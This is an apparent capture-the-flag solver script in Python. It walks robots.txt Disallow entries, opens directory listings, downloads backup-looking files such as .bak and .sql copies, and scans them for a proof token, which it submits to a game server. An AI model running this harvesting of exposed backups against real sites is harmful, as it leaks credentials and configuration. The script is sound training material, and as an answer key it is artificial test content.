#!/usr/bin/env python3
"""Day 19 web-exploitation / Back Up a Minute (backup-exposure) solver.

Live-target lane. The proof is recovered from an exposed deployment backup:
  root HTML hints at "crawler policy" -> /robots.txt discloses a Disallow'd
  directory -> that directory has an open index listing a *.bak (env copy) ->
  the backup contains `proof_<hex>`.

Generic, not hard-coded: it derives the secret directory from robots.txt and
the backup file from the directory index, then scans fetched text for the
proof token. Paced: one request at a time, with a short delay, timeouts, and
NO fuzzing/wordlists (respects the shared-endpoint no-saturation rule).

Usage:
  solve.py start   <challenge-id> [--run-for-time]   # start/reconnect, print targets
  solve.py solve   <challenge-id>                     # start (untimed), recover, submit
Env: HUNTRESS_GM_URL, HUNTRESS_GM_TOKEN.
"""
import argparse, json, os, re, sys, time, pathlib
from html.parser import HTMLParser
import requests

GM = os.environ["HUNTRESS_GM_URL"].rstrip("/")
TOK = os.environ["HUNTRESS_GM_TOKEN"]
RUN = pathlib.Path(__file__).resolve().parent / "run"
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")
DELAY = 0.7  # polite spacing between target requests


def gm(payload):
    r = requests.post(GM + "/", headers={"Authorization": "Bearer " + TOK,
                      "Content-Type": "application/json"}, json=payload, timeout=30)
    r.raise_for_status()
    return r.json()


class Links(HTMLParser):
    def __init__(self): super().__init__(); self.hrefs = []
    def handle_starttag(self, tag, attrs):
        if tag == "a":
            for k, v in attrs:
                if k == "href" and v: self.hrefs.append(v)


class Target:
    """A paced HTTP client scoped to one assigned target URL."""
    def __init__(self, base, outdir):
        self.base = base.rstrip("/")
        self.out = outdir; self.out.mkdir(parents=True, exist_ok=True)
        self.s = requests.Session(); self.s.headers["User-Agent"] = "ctf-web-lane/1.0"
        self._first = True

    def get(self, path, save):
        if not self._first: time.sleep(DELAY)
        self._first = False
        url = self.base + path
        r = self.s.get(url, timeout=20)
        (self.out / save).write_bytes(r.content)
        print(f"  GET {path} -> {r.status_code} {len(r.content)}B", file=sys.stderr)
        return r

    def recover_proof(self):
        """Return the proof string for this target, or None."""
        # 1) robots.txt discloses the hidden directory
        rob = self.get("/robots.txt", "robots.txt")
        dirs = re.findall(r"(?mi)^\s*Disallow:\s*(\S+)", rob.text)
        if not dirs:  # fall back to scanning the root HTML for a hint
            dirs = []
        for d in dirs:
            d = "/" + d.strip("/") + "/"
            idx = self.get(d, "index" + d.replace("/", "_") + ".html")
            if idx.status_code != 200:
                continue
            p = Links(); p.feed(idx.text)
            # prefer backup-looking members; otherwise try every listed file
            members = [h for h in p.hrefs if h.rstrip("/").split("/")[-1]]
            members.sort(key=lambda h: 0 if re.search(r"\.(bak|old|orig|save|swp|zip|tar|gz|sql|json)(\.|$)", h, re.I) else 1)
            for h in members:
                path = h if h.startswith("/") else d + h
                r = self.get(path, path.strip("/").replace("/", "_"))
                if r.status_code != 200:
                    continue
                m = PROOF_RE.search(r.text)
                if m:
                    return m.group(0)
        return None


def start(cid, rft=False):
    payload = {"op": "start", "challenge": cid}
    if rft: payload["run_for_time"] = True
    data = gm(payload)
    RUN.mkdir(parents=True, exist_ok=True)
    (RUN / "start.json").write_text(json.dumps(data, indent=2))
    return data


def solve(cid):
    data = start(cid)
    if data.get("result") not in ("active", None) and "targets" not in data:
        print("unexpected start response:", json.dumps(data)[:400]); sys.exit(1)
    targets = {t["id"]: t["url"] for t in data.get("targets", [])}
    print("targets:", targets, file=sys.stderr)
    # map each question to its target via the `artifact` field ("Target N")
    answers = {}
    for q in data["questions"]:
        tid = q.get("artifact")
        url = targets.get(tid)
        if not url:
            print(f"no target url for {q['id']} ({tid})"); continue
        safe = re.sub(r"\W+", "_", tid)
        proof = Target(url, RUN / safe).recover_proof()
        print(f"{q['id']} [{tid}] -> {proof}", file=sys.stderr)
        if proof:
            answers[q["id"]] = proof
    if len(answers) != len(data["questions"]):
        print("did not recover all proofs; not submitting:", answers); sys.exit(2)
    res = gm({"op": "submit", "challenge": cid, "answers": answers})
    (RUN / "submit.json").write_text(json.dumps(res, indent=2))
    print(json.dumps({k: res.get(k) for k in ("result", "remaining", "accepted_ids", "flag")}))


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("cmd", choices=["start", "solve"])
    ap.add_argument("challenge")
    ap.add_argument("--run-for-time", action="store_true")
    a = ap.parse_args()
    if a.cmd == "start":
        print(json.dumps(start(a.challenge, a.run_for_time).get("targets"), indent=2))
    else:
        solve(a.challenge)
